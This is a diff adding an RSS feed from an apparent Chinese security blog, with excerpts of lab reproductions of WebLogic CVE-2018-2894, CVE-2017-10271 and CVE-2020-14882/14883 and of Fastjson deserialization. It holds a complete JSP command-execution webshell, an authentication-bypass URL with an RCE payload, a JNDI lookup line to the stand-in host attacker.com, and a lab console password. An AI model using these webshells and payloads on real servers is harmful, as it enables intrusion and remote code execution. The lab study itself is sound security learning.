@@ -1,0 +1,487 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>漏洞复现 on 1ux4ry Archive</title><link>https://luxuryzcx.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link><description>Recent content in 漏洞复现 on 1ux4ry Archive</description><generator>Hugo</generator><language>zh-cn</language><lastBuildDate>Wed, 01 Jul 2026 19:10:57 +0800</lastBuildDate><atom:link href="https://luxuryzcx.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.xml" rel="self" type="application/rss+xml"/><item><title>weblogic CVE-2018-2894</title><link>https://luxuryzcx.github.io/posts/weblogic-cve-2018-2894/</link><pubDate>Wed, 01 Jul 2026 19:10:57 +0800</pubDate><guid>https://luxuryzcx.github.io/posts/weblogic-cve-2018-2894/</guid><description>&lt;h1 id="漏洞描述"&gt;漏洞描述&lt;/h1&gt;
+&lt;p&gt;这是 WebLogic 中最著名的文件上传漏洞，它完美体现了“功能配置不当”导致的严重后果。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;漏洞成因：WebLogic 的 &lt;code&gt;ws_utc&lt;/code&gt; 服务接口（用于 Web Service 测试）在未授权情况下允许配置上传路径。攻击者可以修改上传目录，直接将文件写入到 Web 服务的静态资源路径下。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;利用流程：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;访问接口：访问 &lt;code&gt;/ws_utc/config.do&lt;/code&gt; 等相关端点。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;配置篡改：将 &lt;code&gt;Work Home&lt;/code&gt;（上传路径）修改为 Web 根目录（例如 &lt;code&gt;.../user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-test-app_.../war/&lt;/code&gt;）。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;直接上传：利用接口提供的上传功能，直接上传包含 JSP 代码的文件。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;执行代码：直接访问刚刚上传的 JSP 文件，WebLogic 解析并执行其中的恶意逻辑。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id="漏洞复现"&gt;漏洞复现&lt;/h1&gt;
+&lt;p&gt;打开网站&lt;/p&gt;
+&lt;p&gt;http://your-ip:7001/console&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260701184734662.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;然后密码是在 docker 容器里面看的&lt;/p&gt;
+&lt;p&gt;TDIHk8dF&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260701184841065.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;登录&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260701184925367.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;登录后台页面，点击 &lt;code&gt;base_domain&lt;/code&gt; 的配置，在&amp;quot;高级&amp;quot;中开启&amp;quot;启用 Web 服务测试页&amp;quot;选项：&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260701185045078.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;访问 &lt;code&gt;http://your-ip:7001/ws_utc/config.do&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260701185912945.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;设置 Work Home Dir 为 &lt;code&gt;/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css&lt;/code&gt;。我将目录设置为 &lt;code&gt;ws_utc&lt;/code&gt; 应用的静态文件 css 目录，访问这个目录是无需权限的，这一点很重要。&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260701185959689.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;然后保存成功&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260701190019785.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;然后点击安全 -&amp;gt; 增加，然后上传 webshell：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;%@ page import=&amp;#34;java.util.*,java.io.*&amp;#34;%&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;%
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;if (request.getParameter(&amp;#34;cmd&amp;#34;) != null) {
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;    Process p = Runtime.getRuntime().exec(request.getParameter(&amp;#34;cmd&amp;#34;));
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;    OutputStream os = p.getOutputStream();
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;    InputStream in = p.getInputStream();
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;    DataInputStream dis = new DataInputStream(in);
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;    String disr = dis.readLine();
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;    while (disr != null) {
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;        out.println(disr);
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;        disr = dis.readLine();
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;%&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260701190235691.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;</description></item><item><title>weblogic CVE-2017-10271 （XML Deco）</title><link>https://luxuryzcx.github.io/posts/weblogic-cve-2017-10271-xml-deco/</link><pubDate>Tue, 30 Jun 2026 21:12:18 +0800</pubDate><guid>https://luxuryzcx.github.io/posts/weblogic-cve-2017-10271-xml-deco/</guid><description>&lt;h1 id="漏洞原理"&gt;漏洞原理&lt;/h1&gt;
+&lt;p&gt;什么是 XMLDecoder？&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;java.beans.XMLDecoder&lt;/code&gt; 是 JDK 提供的一个类，原本设计目的是将 Java Bean 序列化为 XML 格式，或者将 XML 反序列化还原为 Java Bean。&lt;/p&gt;
+&lt;p&gt;它的工作方式是通过读取 XML 标签来调用 Java 的 API：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;它允许 XML 文件中包含 &lt;code&gt;&amp;lt;object&amp;gt;&lt;/code&gt;、&lt;code&gt;&amp;lt;void&amp;gt;&lt;/code&gt;、&lt;code&gt;&amp;lt;new&amp;gt;&lt;/code&gt; 等标签。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;它可以根据这些标签去实例化任意 Java 类，并调用其中的方法。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;这本身就是一个极大的安全隐患：如果攻击者能够控制这段 XML 内容，他就拥有了在服务端执行任意代码的权限。&lt;/p&gt;
+&lt;p&gt;漏洞触发的核心机制&lt;/p&gt;
+&lt;p&gt;在 WebLogic 中，该漏洞主要集中在 &lt;code&gt;wls-wsat&lt;/code&gt; 组件中。WebLogic 使用 &lt;code&gt;XMLDecoder&lt;/code&gt; 来解析某些 Web Service 的请求体。&lt;/p&gt;
+&lt;p&gt;攻击链的逻辑非常直接：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;注入攻击载荷：攻击者构造一个恶意的 XML 请求，发送给 WebLogic 的特定 URL（如 &lt;code&gt;/wls-wsat/CoordinatorPortType&lt;/code&gt;）。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;XML 解析与实例化：&lt;code&gt;XMLDecoder&lt;/code&gt; 接收到请求，开始解析 XML。它根据 XML 中的 &lt;code&gt;&amp;lt;object&amp;gt;&lt;/code&gt; 标签，实例化一个类（例如 &lt;code&gt;java.lang.ProcessBuilder&lt;/code&gt;）。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;方法调用：根据 XML 中的 &lt;code&gt;&amp;lt;void property=&amp;quot;command&amp;quot;&amp;gt;&lt;/code&gt; 或 &lt;code&gt;&amp;lt;void method=&amp;quot;start&amp;quot;&amp;gt;&lt;/code&gt; 等标签，&lt;code&gt;XMLDecoder&lt;/code&gt; 会调用该对象的方法。&lt;/p&gt;</description></item><item><title>weblogic CVE-2020-14882 &amp; CVE-2020-14883</title><link>https://luxuryzcx.github.io/posts/weblogic-cve-2020-14882-cve-2020-14883/</link><pubDate>Tue, 30 Jun 2026 21:11:52 +0800</pubDate><guid>https://luxuryzcx.github.io/posts/weblogic-cve-2020-14882-cve-2020-14883/</guid><description>&lt;h1 id="漏洞描述"&gt;漏洞描述&lt;/h1&gt;
+&lt;p&gt;典型的 WebLogic 后台身份验证绕过（Authentication Bypass）漏洞&lt;/p&gt;
+&lt;p&gt;核心原理：URL 标准化不一致 (Normalization Mismatch)&lt;/p&gt;
+&lt;p&gt;这个漏洞的本质是：安全过滤器（Security Filter）和后端 Servlet（Resource Handler）对 URL 的解析逻辑不一致。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;过滤器 (Security Filter)它会检查访问路径是否合法。它看到 &lt;code&gt;/console/login/forms/..%2f..%2fconsole.portal&lt;/code&gt;，由于它对路径进行了标准化处理，或者黑名单机制不够完善，它认为这是一个请求登录页面的“安全”路径，因此放行。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;后端 (Backend Servlet)它处理实际的业务。当接收到这个路径时，它将 &lt;code&gt;%2e%2e%2f&lt;/code&gt; 还原为 &lt;code&gt;../&lt;/code&gt;，直接跳转到了管理控制台的根目录，从而完全绕过了登录鉴权。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id="cve-2020-14882"&gt;CVE-2020-14882&lt;/h1&gt;
+&lt;p&gt;打开网站&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260630095324815.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;然后直接尝试用 payload 试试&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;console&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;css&lt;/span&gt;&lt;span class="o"&gt;/%&lt;/span&gt;&lt;span class="mi"&gt;252&lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;252&lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mf"&gt;252f&lt;/span&gt;&lt;span class="n"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;portal&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;发现未授权进后台了&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260630095847557.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;其实与正常的账号密码进入还是有区别的 不能部署 war 包&lt;/p&gt;
+&lt;p&gt;这里就需要 用 CVE-2020-14883 这个漏洞了&lt;/p&gt;
+&lt;h1 id="cve-2020-14883"&gt;CVE-2020-14883&lt;/h1&gt;
+&lt;p&gt;直接用这个命令尝试RCE 直接拼接 url 即可 然后 未授权进行&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;console&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;css&lt;/span&gt;&lt;span class="o"&gt;/%&lt;/span&gt;&lt;span class="mi"&gt;252&lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;252&lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mf"&gt;252f&lt;/span&gt;&lt;span class="n"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;portal&lt;/span&gt;&lt;span class="o"&gt;?&lt;/span&gt;&lt;span class="n"&gt;_nfpb&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;true&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;_pageLabel&lt;/span&gt;&lt;span class="o"&gt;=&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;handle&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;tangosol&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;coherence&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;mvel2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sh&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;ShellSession&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;java.lang.Runtime.getRuntime().exec(&amp;#39;touch%20/tmp/success1&amp;#39;);&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;发现已经成功写入了&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260630103721043.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;</description></item><item><title>fastjson利用方面 出网和不出网</title><link>https://luxuryzcx.github.io/posts/fastjson%E5%88%A9%E7%94%A8%E6%96%B9%E9%9D%A2-%E5%87%BA%E7%BD%91%E5%92%8C%E4%B8%8D%E5%87%BA%E7%BD%91/</link><pubDate>Tue, 30 Jun 2026 21:10:48 +0800</pubDate><guid>https://luxuryzcx.github.io/posts/fastjson%E5%88%A9%E7%94%A8%E6%96%B9%E9%9D%A2-%E5%87%BA%E7%BD%91%E5%92%8C%E4%B8%8D%E5%87%BA%E7%BD%91/</guid><description>&lt;h1 id="什么是出网和不出网"&gt;什么是出网和不出网&lt;/h1&gt;
+&lt;p&gt;出网 靶机或者目标网站 能够访问 外网 （或者 vps）&lt;/p&gt;
+&lt;p&gt;不出网 靶机或者目标网站 不能够 访问 （被防火墙给限制，出不去）&lt;/p&gt;
+&lt;h1 id="出网"&gt;出网&lt;/h1&gt;
+&lt;p&gt;经典 jndi 注入思路&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="err"&gt;受害端&lt;/span&gt; &lt;span class="nf"&gt;parseObject&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;payload&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;→&lt;/span&gt; &lt;span class="n"&gt;JdbcRowSetImpl&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;setAutoCommit&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;→&lt;/span&gt; &lt;span class="n"&gt;InitialContext&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;lookup&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;ldap://attacker.com/Exploit&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;→&lt;/span&gt; &lt;span class="err"&gt;向&lt;/span&gt; &lt;span class="n"&gt;attacker&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt; &lt;span class="err"&gt;拉取远程&lt;/span&gt; &lt;span class="n"&gt;Codebase&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;→&lt;/span&gt; &lt;span class="err"&gt;加载&lt;/span&gt; &lt;span class="n"&gt;Reference&lt;/span&gt; &lt;span class="err"&gt;指定的远程类&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;依托 ldap 拉取远程服务器上恶意的类 如果不出网 那整个链子就废了&lt;/p&gt;
+&lt;p&gt;序列化的最终目的是将 字节码 塞到 jvm 执行命令 出网是借助外部的远程服务器上的恶意的类&lt;/p&gt;
+&lt;p&gt;不出网只要通过一个方式或手段 达到 出网的效果就行了&lt;/p&gt;
+&lt;h1 id="不出网"&gt;不出网&lt;/h1&gt;
+&lt;p&gt;核心的函数 defineClass&lt;/p&gt;
+&lt;p&gt;ava.lang.ClassLoader` 提供了一个 native 方法：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-java" data-lang="java"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="kd"&gt;protected&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kd"&gt;final&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Class&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;?&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;defineClass&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;byte&lt;/span&gt;&lt;span class="o"&gt;[]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;off&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;len&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这个方法直接接收字节数组 完全不依赖文件系统 不依赖网络&lt;/p&gt;
+&lt;p&gt;而且 不管绕多少层 最终都会 走到这个链子&lt;/p&gt;
+&lt;p&gt;所以只要目标 能够顺这个链子打进去就行&lt;/p&gt;
+&lt;p&gt;不出网的三种主流方式&lt;/p&gt;
+&lt;table&gt;
+	&lt;thead&gt;
+			&lt;tr&gt;
+					&lt;th&gt;方式&lt;/th&gt;
+					&lt;th&gt;字节码载体&lt;/th&gt;
+					&lt;th&gt;适用场景&lt;/th&gt;
+			&lt;/tr&gt;
+	&lt;/thead&gt;
+	&lt;tbody&gt;
+			&lt;tr&gt;
+					&lt;td&gt;自定义 ClassLoader&lt;/td&gt;
+					&lt;td&gt;直接 &lt;code&gt;byte[]&lt;/code&gt;&lt;/td&gt;
+					&lt;td&gt;内存马、Agent 注入&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;BCEL ClassLoader&lt;/td&gt;
+					&lt;td&gt;&lt;code&gt;$$BCEL$$&amp;lt;encoded&amp;gt;&lt;/code&gt; 字符串&lt;/td&gt;
+					&lt;td&gt;Fastjson、XBean 链&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;TemplatesImpl&lt;/td&gt;
+					&lt;td&gt;Base64 编码的 &lt;code&gt;_bytecodes&lt;/code&gt;&lt;/td&gt;
+					&lt;td&gt;Fastjson、SnakeYAML&lt;/td&gt;
+			&lt;/tr&gt;
+	&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2 id="1自定义-classloader"&gt;1.自定义 ClassLoader&lt;/h2&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-java" data-lang="java"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="kd"&gt;public&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kd"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;MemoryClassLoader&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kd"&gt;extends&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ClassLoader&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kd"&gt;public&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Class&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;?&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;loadFromBytes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;byte&lt;/span&gt;&lt;span class="o"&gt;[]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;bytecode&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;defineClass&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;bytecode&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;bytecode&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;length&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;defineClass&lt;/code&gt; 被调用后，JVM 会：&lt;/p&gt;</description></item><item><title>Fastjson反序列化 1.2.47</title><link>https://luxuryzcx.github.io/posts/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1247/</link><pubDate>Tue, 30 Jun 2026 21:08:03 +0800</pubDate><guid>https://luxuryzcx.github.io/posts/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1247/</guid><description>&lt;h1 id="原理"&gt;原理&lt;/h1&gt;
+&lt;p&gt;Fastjson 1.2.47 之前的漏洞利用了以下特性：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;autotype 黑名单绕过 - 通过 java.lang.Class 的特殊处理机制，先将恶意类加载到缓存&lt;/li&gt;
+&lt;li&gt;JNDI 注入 - 通过 JdbcRowSetImpl 类触发 JNDI 连接，加载远程恶意类执行代码&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h1 id="过程"&gt;过程&lt;/h1&gt;
+&lt;p&gt;这里我们用jar包来进行搭建测试 当然也可以 docker 来进行 这里我们用 docker 来运行&lt;/p&gt;
